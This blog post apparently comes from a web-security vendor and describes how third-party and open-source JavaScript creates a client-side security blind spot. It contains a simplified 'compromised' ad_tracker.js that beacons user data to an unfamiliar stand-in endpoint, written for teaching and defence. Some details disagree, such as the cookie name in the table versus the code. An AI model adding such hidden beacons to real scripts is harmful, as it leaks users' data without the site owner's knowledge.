---
template: "blog/blog-post"
draft: false

# Metadata
title: "Client-Side - The Security Blindspot of your Website"
description: "Developing and managing a web application to scale has evolved in many different ways over the past two decades. In the following post, we’ll describe how a few of the more notable changes have led web application operators into a challenging situation."

# Breadcrumbs
breadcrumbs:
  - name: Home
    path: /
  - name: Blog
    path: /blog/1/
  - name: "Client-Side The Security Blindspot..."

# Fields
date: 2019-04-22
author:
  - Ben Diamant

blog_title: "Client-Side - The Security Blindspot of your Website"
categories: Thought Leadership
tags:
  - client side
  - third party
  - open source
  - javascript

thumbnail: client-side.jpg
---

Developing and managing a web application to scale has evolved in many different ways over the past two decades. In the following post, we’ll describe how a few of the more notable changes have led web application operators into a challenging situation.

## The Evolution of Web Applications

With the growth in global internet bandwidth, stronger computers, and extremely powerful modern browsers, web application architecture has changed significantly in two aspects:

- **An explosion of Web & Mobile Applications** - The number of [websites in 2019](http://www.internetlivestats.com/total-number-of-websites/#chart_trend) (1.6 billion) is 8x of what it was in 2010. Modern websites typically contain a set of transactional logic, such as financial transactions, online identity, shopping, booking, banking, media consumption, and more. many operated by Javascript code from third-party vendors. Over time, small monolith websites have grown into multicomponent systems where each component is nearly autonomous.
- **Web Applications code moved to the Client-Side** - To achieve better performance and experience for the end-user, and to reduce the load from server-side processing, core logic in modern web applications has shifted from server-side processing to front end javascript libraries. [According to httparchive.org](https://httparchive.org/reports/state-of-javascript?start=earliest&end=2019_01_01&view=list), between Nov 2010 to Jan 2019 front-end javascript code has grown in size over 347% for desktop and over 593% for mobile and keeps growing.

## The Evolution of the Development Teams

With the increasing complexity of web development processes and the multiple functions that are needed within the web development team, website teams keep growing.
Front-end is hot - as a result of the shift to client-side development - web developers are moving to front-end or full-stack development. In fact, by 2024 web developer job growth is expected to increase by 27% according to the [U.S. Bureau of Labor Statistics](https://www.bls.gov/ooh/computer-and-information-technology/web-developers.htm#tab-6), and full stack developer ranked second—last year’s top job—in Indeed’s report for [Best Jobs of 2018](https://www.veracode.com/despite-major-vulnerability-disclosures-wannacry-new-research-finds-open-source-components-fail).
It all boils down to the fact that there are many more “hands” working on the same code base, pushing new code to the browser.

A few years back, a single team was responsible for all aspects of web application development. Current challenges have created a dynamic situation where multiple teams are working on the same website, each in a different section or layer, and often completely out of sync for changes with mutual impact.

## The Evolution of Client Side Javascript

Developers once had full accountability for website source code. Today things are a bit different, due to the following trends in the last few years:

- **The rise of Open-source libraries** - thousands of open source libraries contributes today to a big portion of the modern web app code base. CA Veracode recently found that 83 percent of developers use code components to build web applications, and when looking at front-end code, it’s probably much more than that.
- **More teams in the company require javascript libraries** - The market is more digitally oriented than ever. With multiple teams from marketing, sales and customer success, using lead tracking metrics, support, and chat widgets, to Site Reliability Engineers adding performance and stability services, the use of third-party javascript libraries is on the rise.
  This means that multiple vendor scripts are running on the client-side of the website, and more data is being shared with and exposed to these vendors.
  These circumstances put developers in a position of reduced control over the final code running in user's browsers.

![image of code](/assets/images/blog/client-side.jpg)<br>

Everything described above has led to a situation where a standard web app easily becomes a large system built from in-house code, third-party vendor code, and open source libraries, all managed by different teams, highlighting a problem: increased vulnerability to client-side attacks. A short scan of [Alexa Top](https://www.alexa.com/topsites) 500 websites shows that, on average, websites load ~15 different third-party libraries. The root of the problem is that these libraries are statically loaded into the page by an inline snippet, but dynamically change their content in the background, outside of the site owner's control.

Let’s differentiate between the main sources of these modules

1. **Third-party vendors** - These are companies which the web operator is contracting to provide a service. Such vendors are supposed to be reliable (and in many cases compliant with various standards), but they don’t usually provide visibility to code updates or changes nor the ability to lock a specific version that was audited when first integrated.
2. **Open source libraries** - while providing many benefits, and enabling developers to lock a version and stay in control, it is extremely hard for a site operator to monitor and audit the entire code and changes, and on several occasions, [a bad player contributed infected or vulnerable code to such libraries](https://medium.com/intrinsic/compromised-npm-package-event-stream-d47d08605502).

Scripts from both of these sources can lead to javascript behavioral changes on the page, affecting factors such as:

- Network protocols and network destinations
- Storage properties (cookies, local/session storage) that are being accessed and manipulated and the associated storage keys
- Mutated DOM elements that could impact the user experience

In reality, in the modern web development process - there is a big gap between the level of supervision of in-house code changes pushed to production, and the extreme ease of code changes by a third-party vendor lacking any supervision - while both of them are running on the same webpage.

In this series of blog posts, we will show how this trend is being targeted by attackers, and suggest different methods that can help get visibility and better insights into analyzing front end code and changes in it.

Let’s take a simplified example of how the behavior of a third-party library may change as a result of a breach.
This is an ad optimization third-party library that collects ad related metrics and was added to a website by the marketing team. After the third-party vendor that provides this service was breached, the behavior of the library has changed.
The new behavior of the library includes potentially leaking users’ sensitive data to an unfamiliar HTTP endpoint, without the awareness of the web operator, who can do nothing to prevent or mitigate this data leak.

Script was added to the <head> tag from a known CDN

```html
<head>
  <script src="http://SOME-CDN.com/assets/ad_tracker.js"></script>
</head>
```

_The Original ad_tracker.js_

```javascript
let EVENTS = [];
const TARGET_SERVER = "https://events-server.com/api";
document.getElementById("ad").addEventListener("mousemove", function(event) {
  const lastPos = `${event.clientY},${event.clientX}`;
  EVENTS.push(lastPos);
  document.cookie = `lastpos=${lastPos}`;
  if (EVENTS.length > 10) {
    flashEvents();
  }
});

function flashEvents() {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", TARGET_SERVER);
  xhr.send(JSON.stringify(EVENTS));
  EVENTS = [];
}
```

Let's map the behavior of the script:

<table>
   <thead>
      <tr>
         <th>Operator</th>
         <th>Action</th>
         <th>Target</th>
      </tr>
   </thead>
   <tbody>
      <tr>
         <td>ad_tracker.js</td>
         <td>Set cookie</td>
         <td>“lastpos” cookie</td>
      </tr>
      <tr>
         <td>ad_tracker.js</td>
         <td>DOM Element Lookup</td>
         <td>DIV#ad</td>
      </tr>
      <tr>
         <td>ad_tracker.js</td>
         <td>Network XHR</td>
         <td>ht<span>tps://events-server.com/api</td>
      </tr>
   </tbody>
</table>

Now at this stage, the script got breached, and with the content change, the script behavior changed as well.
The script still performs most of the actions performed before, only now, new actions have also been added. These actions are taking the sensitive data collected by the original script, and sending it to a new endpoint to be saved by an unfamiliar browser storage entity.

_New ad_tracker.js version content_

```javascript
let EVENTS = [];
const TARGET_SERVER = "https://events-server.com/api";
const TARGET_SERVER1 = "https://users-server.com/api";
document.getElementById("ad").addEventListener("mousemove", function(event) {
  const lastPos = `${event.clientY},${event.clientX}`;
  EVENTS.push(lastPos);
  document.cookie = `lastpos_cookie=${lastPos}`;
  localStorage.setItem("lastpos", `${lastPos}`); // User’s data is saved to a new storage entity
  if (EVENTS.length > 10) {
    flashEvents();
  }
});

function flashEvents() {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", TARGET_SERVER);
  xhr.send(JSON.stringify(EVENTS));
  EVENTS = [];

  if (navigator.sendBeacon) {
    const data = "events=" + JSON.stringify(EVENTS);
    navigator.sendBeacon(TARGET_SERVER1, data); // User’s data is sent to a new HTTP endpoint
  }
}
```

Here’s how the new behavior map of the script looks like:

<table>
   <thead>
      <tr>
         <th>Operator</th>
         <th>Action</th>
         <th>Target</th>
         <th>Details</th>
      </tr>
   </thead>
   <tbody>
      <tr>
         <td>ad_tracker.js</td>
         <td>Cookie Setter</td>
         <td>“lastpos_data” cookie</td>
         <td class="yellow">Target changed</td>
      </tr>
      <tr>
         <td>ad_tracker.js</td>
         <td>DOM Element Lookup</td>
         <td>DIV#ad</td>
         <td class="green">Known behavior</td>
      </tr>
      <tr>
         <td>ad_tracker.js</td>
         <td>Network XHR</td>
         <td>ht<span>tps://events-server.com/api</td>
         <td class="green">Known behavior</td>
      </tr>
      <tr>
         <td>ad_tracker.js</td>
         <td>Localstorage Setter</td>
         <td>"lastpos" storage key</td>
         <td class="red">New behavior</td>
      </tr>
      <tr>
         <td>ad_tracker.js</td>
         <td>Network Beacon</td>
         <td>ht<span>tps://users-server.com/api</td>
         <td class="red">New behavior</td>
      </tr>
   </tbody>
</table>

The new actions performed by the third-party library are completely invisible to the web developers and SREs responsible for the site performance and experience, and liable for their users’ data. This script could potentially send sensitive data from the local storage to an unknown domain, and they are not notified of this kind of change nor have an easy way to control them.

This is just one example of what constantly happens on the client-side of the websites, leaving the website's operator blind to a significant part of the website activity.

In the [next blog post in this series](/blog/client-side-battle-against-javascript-attacks/), we’ll review the implication from a different angle, and talk about how these changing libraries impact the end-users, and how this opens a door for data breaches and user session hijacking threats. [Follow us here](https://www.perimeterx.com/feeds/blog.xml).
